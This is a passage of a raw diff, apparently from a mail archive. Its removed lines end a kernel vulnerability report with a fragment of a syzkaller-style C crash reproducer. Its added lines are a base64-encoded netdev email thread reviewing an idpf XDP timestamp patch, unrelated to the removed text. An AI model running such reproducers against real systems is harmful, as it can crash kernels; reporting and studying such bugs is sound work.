-l, /*prot=3D*/0ul, /*flags=3DMAP_FIXED|MAP_ANONYMOUS|MAP_PRIVATE*/0x32ul, /=
-*fd=3D*/(intptr_t)-1, /*offset=3D*/0ul);
->         for(int i=3D0;i<1;i++){
->                 execute_one();
->         }
->
->         return 0;
-> }
->
-> ```
->
->
-> ## Kernel Configuration Requirements for Reproduction
->
-> The vulnerability can be triggered with the kernel config in the attachme=
-nt.
+DQoNCj4gLS0tLS1PcmlnaW5hbCBNZXNzYWdlLS0tLS0NCj4gRnJvbTogTWluYSBBbG1hc3J5IDxh
+bG1hc3J5bWluYUBnb29nbGUuY29tPg0KPiBTZW50OiBNb25kYXksIERlY2VtYmVyIDEsIDIwMjUg
+MjoyNyBBTQ0KPiBUbzogTG9rdGlvbm92LCBBbGVrc2FuZHIgPGFsZWtzYW5kci5sb2t0aW9ub3ZA
+aW50ZWwuY29tPg0KPiBDYzogbmV0ZGV2QHZnZXIua2VybmVsLm9yZzsgYnBmQHZnZXIua2VybmVs
+Lm9yZzsgbGludXgtDQo+IGtlcm5lbEB2Z2VyLmtlcm5lbC5vcmc7IFlpRmVpIFpodSA8emh1eWlm
+ZWlAZ29vZ2xlLmNvbT47IEFsZXhlaQ0KPiBTdGFyb3ZvaXRvdiA8YXN0QGtlcm5lbC5vcmc+OyBE
+YW5pZWwgQm9ya21hbm4gPGRhbmllbEBpb2dlYXJib3gubmV0PjsNCj4gRGF2aWQgUy4gTWlsbGVy
+IDxkYXZlbUBkYXZlbWxvZnQubmV0PjsgSmFrdWIgS2ljaW5za2kNCj4gPGt1YmFAa2VybmVsLm9y
+Zz47IEplc3BlciBEYW5nYWFyZCBCcm91ZXIgPGhhd2tAa2VybmVsLm9yZz47IEpvaG4NCj4gRmFz
+dGFiZW5kIDxqb2huLmZhc3RhYmVuZEBnbWFpbC5jb20+OyBTdGFuaXNsYXYgRm9taWNoZXYNCj4g
+PHNkZkBmb21pY2hldi5tZT47IE5ndXllbiwgQW50aG9ueSBMIDxhbnRob255Lmwubmd1eWVuQGlu
+dGVsLmNvbT47DQo+IEtpdHN6ZWwsIFByemVteXNsYXcgPHByemVteXNsYXcua2l0c3plbEBpbnRl
+bC5jb20+OyBBbmRyZXcgTHVubg0KPiA8YW5kcmV3K25ldGRldkBsdW5uLmNoPjsgRXJpYyBEdW1h
+emV0IDxlZHVtYXpldEBnb29nbGUuY29tPjsgUGFvbG8NCj4gQWJlbmkgPHBhYmVuaUByZWRoYXQu
+Y29tPjsgTG9iYWtpbiwgQWxla3NhbmRlcg0KPiA8YWxla3NhbmRlci5sb2Jha2luQGludGVsLmNv
+bT47IFJpY2hhcmQgQ29jaHJhbg0KPiA8cmljaGFyZGNvY2hyYW5AZ21haWwuY29tPjsgaW50ZWwt
+d2lyZWQtbGFuQGxpc3RzLm9zdW9zbC5vcmcNCj4gU3ViamVjdDogUmU6IFtJbnRlbC13aXJlZC1s
+YW5dIFtQQVRDSCBuZXQtbmV4dCB2MV0gaWRwZjogZXhwb3J0IFJYDQo+IGhhcmR3YXJlIHRpbWVz
+dGFtcGluZyBpbmZvcm1hdGlvbiB0byBYRFANCj4gDQo+IE9uIE1vbiwgTm92IDI0LCAyMDI1IGF0
+IDI6MzPigK9BTSBMb2t0aW9ub3YsIEFsZWtzYW5kcg0KPiA8YWxla3NhbmRyLmxva3Rpb25vdkBp
+bnRlbC5jb20+IHdyb3RlOg0KPiA+DQo+ID4NCj4gPg0KPiA+ID4gLS0tLS1PcmlnaW5hbCBNZXNz
+YWdlLS0tLS0NCj4gPiA+IEZyb206IEludGVsLXdpcmVkLWxhbiA8aW50ZWwtd2lyZWQtbGFuLWJv
+dW5jZXNAb3N1b3NsLm9yZz4gT24NCj4gQmVoYWxmDQo+ID4gPiBPZiBNaW5hIEFsbWFzcnkNCj4g
+PiA+IFNlbnQ6IFNhdHVyZGF5LCBOb3ZlbWJlciAyMiwgMjAyNSAzOjA5IFBNDQo+ID4gPiBUbzog
+bmV0ZGV2QHZnZXIua2VybmVsLm9yZzsgYnBmQHZnZXIua2VybmVsLm9yZzsgbGludXgtDQo+ID4g
+PiBrZXJuZWxAdmdlci5rZXJuZWwub3JnDQo+ID4gPiBDYzogWWlGZWkgWmh1IDx6aHV5aWZlaUBn
+b29nbGUuY29tPjsgQWxleGVpIFN0YXJvdm9pdG92DQo+ID4gPiA8YXN0QGtlcm5lbC5vcmc+OyBE
+YW5pZWwgQm9ya21hbm4gPGRhbmllbEBpb2dlYXJib3gubmV0PjsgRGF2aWQgUy4NCj4gPiA+IE1p
+bGxlciA8ZGF2ZW1AZGF2ZW1sb2Z0Lm5ldD47IEpha3ViIEtpY2luc2tpIDxrdWJhQGtlcm5lbC5v
+cmc+Ow0KPiA+ID4gSmVzcGVyIERhbmdhYXJkIEJyb3VlciA8aGF3a0BrZXJuZWwub3JnPjsgSm9o
+biBGYXN0YWJlbmQNCj4gPiA+IDxqb2huLmZhc3RhYmVuZEBnbWFpbC5jb20+OyBTdGFuaXNsYXYg
+Rm9taWNoZXYgPHNkZkBmb21pY2hldi5tZT47DQo+ID4gPiBOZ3V5ZW4sIEFudGhvbnkgTCA8YW50
+aG9ueS5sLm5ndXllbkBpbnRlbC5jb20+OyBLaXRzemVsLA0KPiBQcnplbXlzbGF3DQo+ID4gPiA8
+cHJ6ZW15c2xhdy5raXRzemVsQGludGVsLmNvbT47IEFuZHJldyBMdW5uDQo+IDxhbmRyZXcrbmV0
+ZGV2QGx1bm4uY2g+Ow0KPiA+ID4gRXJpYyBEdW1hemV0IDxlZHVtYXpldEBnb29nbGUuY29tPjsg
+UGFvbG8gQWJlbmkNCj4gPHBhYmVuaUByZWRoYXQuY29tPjsNCj4gPiA+IExvYmFraW4sIEFsZWtz
+YW5kZXIgPGFsZWtzYW5kZXIubG9iYWtpbkBpbnRlbC5jb20+OyBSaWNoYXJkDQo+IENvY2hyYW4N
+Cj4gPiA+IDxyaWNoYXJkY29jaHJhbkBnbWFpbC5jb20+OyBpbnRlbC13aXJlZC1sYW5AbGlzdHMu
+b3N1b3NsLm9yZzsgTWluYQ0KPiA+ID4gQWxtYXNyeSA8YWxtYXNyeW1pbmFAZ29vZ2xlLmNvbT4N
+Cj4gPiA+IFN1YmplY3Q6IFtJbnRlbC13aXJlZC1sYW5dIFtQQVRDSCBuZXQtbmV4dCB2MV0gaWRw
+ZjogZXhwb3J0IFJYDQo+ID4gPiBoYXJkd2FyZSB0aW1lc3RhbXBpbmcgaW5mb3JtYXRpb24gdG8g
+WERQDQo+ID4gPg0KPiA+ID4gRnJvbTogWWlGZWkgWmh1IDx6aHV5aWZlaUBnb29nbGUuY29tPg0K
+PiA+ID4NCj4gPiA+IFRoZSBsb2dpYyBpcyBzaW1pbGFyIHRvIGlkcGZfcnhfaHd0c3RhbXAsIGJ1
+dCB0aGUgZGF0YSBpcyBleHBvcnRlZA0KPiA+ID4gYXMgYSBCUEYga2Z1bmMgaW5zdGVhZCBvZiBh
+cHBlbmRlZCB0byBhbiBza2IuDQo+ID4gPg0KPiA+ID4gQSBpZHBmX3F1ZXVlX2hhcyhQVFAsIHJ4
+cSkgY29uZGl0aW9uIGlzIGFkZGVkIHRvIGNoZWNrIHRoZSBxdWV1ZQ0KPiA+ID4gc3VwcG9ydHMg
+UFRQIHNpbWlsYXIgdG8gaWRwZl9yeF9wcm9jZXNzX3NrYl9maWVsZHMuDQo+ID4gPg0KPiA+ID4g
+Q2M6IGludGVsLXdpcmVkLWxhbkBsaXN0cy5vc3Vvc2wub3JnDQo+ID4gPg0KPiA+ID4gU2lnbmVk
+LW9mZi1ieTogWWlGZWkgWmh1IDx6aHV5aWZlaUBnb29nbGUuY29tPg0KPiA+ID4gU2lnbmVkLW9m
+Zi1ieTogTWluYSBBbG1hc3J5IDxhbG1hc3J5bWluYUBnb29nbGUuY29tPg0KPiA+ID4gLS0tDQo+
+ID4gPiAgZHJpdmVycy9uZXQvZXRoZXJuZXQvaW50ZWwvaWRwZi94ZHAuYyB8IDI3DQo+ID4gPiAr
+KysrKysrKysrKysrKysrKysrKysrKysrKysNCj4gPiA+ICAxIGZpbGUgY2hhbmdlZCwgMjcgaW5z
+ZXJ0aW9ucygrKQ0KPiA+ID4NCj4gPiA+IGRpZmYgLS1naXQgYS9kcml2ZXJzL25ldC9ldGhlcm5l
+dC9pbnRlbC9pZHBmL3hkcC5jDQo+ID4gPiBiL2RyaXZlcnMvbmV0L2V0aGVybmV0L2ludGVsL2lk
+cGYveGRwLmMNCj4gPiA+IGluZGV4IDIxY2UyNWIwNTY3Zi4uODUwMzg5Y2E2NmI2IDEwMDY0NA0K
+PiA+ID4gLS0tIGEvZHJpdmVycy9uZXQvZXRoZXJuZXQvaW50ZWwvaWRwZi94ZHAuYw0KPiA+ID4g
+KysrIGIvZHJpdmVycy9uZXQvZXRoZXJuZXQvaW50ZWwvaWRwZi94ZHAuYw0KPiA+ID4gQEAgLTIs
+NiArMiw3IEBADQo+ID4gPiAgLyogQ29weXJpZ2h0IChDKSAyMDI1IEludGVsIENvcnBvcmF0aW9u
+ICovDQo+ID4gPg0KPiA+ID4gICNpbmNsdWRlICJpZHBmLmgiDQo+ID4gPiArI2luY2x1ZGUgImlk
+cGZfcHRwLmgiDQo+ID4gPiAgI2luY2x1ZGUgImlkcGZfdmlydGNobmwuaCINCj4gPiA+ICAjaW5j
+bHVkZSAieGRwLmgiDQo+ID4gPiAgI2luY2x1ZGUgInhzay5oIg0KPiA+ID4gQEAgLTM2OSw2ICsz
+NzAsMzEgQEAgaW50IGlkcGZfeGRwX3htaXQoc3RydWN0IG5ldF9kZXZpY2UgKmRldiwgaW50DQo+
+ID4gPiBuLCBzdHJ1Y3QgeGRwX2ZyYW1lICoqZnJhbWVzLA0KPiA+ID4gICAgICAgICAgICAgICAg
+ICAgICAgICAgICAgICAgICAgICAgIGlkcGZfeGRwX3R4X2ZpbmFsaXplKTsgIH0NCj4gPiA+DQo+
+ID4gPiArc3RhdGljIGludCBpZHBmX3hkcG1vX3J4X3RpbWVzdGFtcChjb25zdCBzdHJ1Y3QgeGRw
+X21kICpjdHgsIHU2NA0KPiA+ID4gKyp0aW1lc3RhbXApIHsNCj4gPiA+ICsgICAgIGNvbnN0IHN0
+cnVjdCB2aXJ0Y2hubDJfcnhfZmxleF9kZXNjX2Fkdl9uaWNfMyAqcnhfZGVzYzsNCj4gPiA+ICsg
+ICAgIGNvbnN0IHN0cnVjdCBsaWJldGhfeGRwX2J1ZmYgKnhkcCA9ICh0eXBlb2YoeGRwKSljdHg7
+DQo+ID4gPiArICAgICBjb25zdCBzdHJ1Y3QgaWRwZl9yeF9xdWV1ZSAqcnhxOw0KPiA+ID4gKyAg
+ICAgdTY0IGNhY2hlZF90aW1lLCB0c19uczsNCj4gPiA+ICsgICAgIHUzMiB0c19oaWdoOw0KPiA+
+ID4gKw0KPiA+ID4gKyAgICAgcnhfZGVzYyA9IHhkcC0+ZGVzYzsNCj4gPiA+ICsgICAgIHJ4cSA9
+IGxpYmV0aF94ZHBfYnVmZl90b19ycSh4ZHAsIHR5cGVvZigqcnhxKSwgeGRwX3J4cSk7DQo+ID4g
+PiArDQo+ID4gPiArICAgICBpZiAoIWlkcGZfcXVldWVfaGFzKFBUUCwgcnhxKSkNCj4gPiA+ICsg
+ICAgICAgICAgICAgcmV0dXJuIC1FTk9EQVRBOw0KPiA+ID4gKyAgICAgaWYgKCEocnhfZGVzYy0+
+dHNfbG93ICYgVklSVENITkwyX1JYX0ZMRVhfVFNUQU1QX1ZBTElEKSkNCj4gPiA+ICsgICAgICAg
+ICAgICAgcmV0dXJuIC1FTk9EQVRBOw0KPiA+IFJYIGZsZXggZGVzYyBmaWVsZHMgYXJlIGxpdHRs
+ZeKAkWVuZGlhbi4NCj4gPiBZb3UgYWxyZWFkeSBjb252ZXJ0IHRzX2hpZ2ggd2l0aCBsZTMyX3Rv
+X2NwdSgpLCBidXQgdGVzdCB0c19sb3cNCj4gZGlyZWN0bHkgYWdhaW5zdCB0aGUgbWFzay4NCj4g
+PiBPbiBiaWfigJFlbmRpYW4gdGhpcyBjYW4gbWlzZGV0ZWN0IHRoZSBiaXQgYW5kIHNwdXJpb3Vz
+bHkgcmV0dXJuIC0NCj4gRU5PREFUQS4NCj4gPiBQbGVhc2UgY29udmVydCB0c19sb3cgdG8gaG9z
+dCBvcmRlciBiZWZvcmUgdGhlIGJpdCB0ZXN0Lg0KPiA+IFNlZSBleGlzdGluZyBJRFBGL0lDRSBw
+YXR0ZXJucyB3aGVyZSBkZXNjcmlwdG9yIHdvcmRzIGFyZQ0KPiBsZVhYX3RvX2NwdSgp4oCRY29u
+dmVydGVkIHByaW9yIHRvIEZJRUxEX0dFVCgpIC8gYml0IGNoZWNrcy4NCj4gPiBBbHNvLCBwZXIg
+dGhlIFhEUCBSWCBtZXRhZGF0YSBrZnVuYyBkb2NzLCAtRU5PREFUQSBtdXN0IHJlZmxlY3QgdHJ1
+ZQ0KPiBhYnNlbmNlIG9mIHBlcuKAkXBhY2tldCBtZXRhZGF0YTsgZW5kaWFubmVzc+KAkWNvcnJl
+Y3QgdGVzdGluZyBpcyByZXF1aXJlZA0KPiB0byB1cGhvbGQgdGhlIHNlbWFudGljLg0KPiA+DQo+
+IA0KPiBIZXksIHNvcnJ5IGZvciB0aGUgbGF0ZSByZXBseS4gSW5pdGlhbGx5IHdoZW4gSSByZWFk
+IHRoZSByZXBseSwgSQ0KPiB0aG91Z2h0OiAid2h5IG5vdCwgbGV0cyBhZGQgYSBsZVhYX3RvX2Nw
+dSIuDQo+IA0KPiBCdXQgbm93IHRoYXQgSSBsb29rIGNsb3NlciB0byBpbXBsZW1lbnQgdGhlIGNo
+YW5nZSBhbmQgc3VibWl0IHYyLCBpdA0KPiBsb29rcyBjb3JyZWN0IGFzIHdyaXR0ZW4uIHRzX2xv
+dyBpcyBkZWZpbmVkIGFzIGEgdTg6DQo+IA0KPiBgYGANCj4gc3RydWN0IHZpcnRjaG5sMl9yeF9m
+bGV4X2Rlc2NfYWR2X25pY18zIHsgLi4uDQo+IHU4IHRzX2xvdzsNCj4gYGBgDQo+IA0KPiBTbyBp
+dCBzaG91bGQgbm90IGJlIGZlZCBpbnRvIGFueSBsZVhYX3RvX2NwdSgpIGZ1bmN0aW9ucywgbm8/
+DQo+IA0KPiBJIGFsc28gbG9va2VkIGF0IG90aGVyIHU4IG1lbWJlcnMgaW4gdGhpcyBzdHJ1Y3Qg
+bGlrZSBgdTgNCj4gc3RhdHVzX2VycjBfcXcwYCBhbmQgYHU4IHN0YXR1c19lcnIwX3F3MWAsIGFu
+ZCBib3RoIGFyZSB1c2VkIGluDQo+IGV4aXN0aW5nIGNvZGUgd2l0aG91dCBhIGNvbnZlcnNpb24u
+IFNvIGl0IHNlZW1zIGNvcnJlY3QgYXMgd3JpdHRlbi4NCj4gQ2FuIHlvdSByZWNvbnNkaXJlcj8N
+Cj4gDQpPaCwgeWVzLiBZb3UgYXJlIHJpZ2h0LiBGb3IgdTggYnl0ZSBlbmRpYW5uZXNzIGhhcyBu
+byBzZW5zZS4gU29ycnkuDQoNClJldmlld2VkLWJ5OiBBbGVrc2FuZHIgTG9rdGlvbm92IDxhbGVr
+c2FuZHIubG9rdGlvbm92QGludGVsLmNvbT4NCg0KDQoNCg==
 
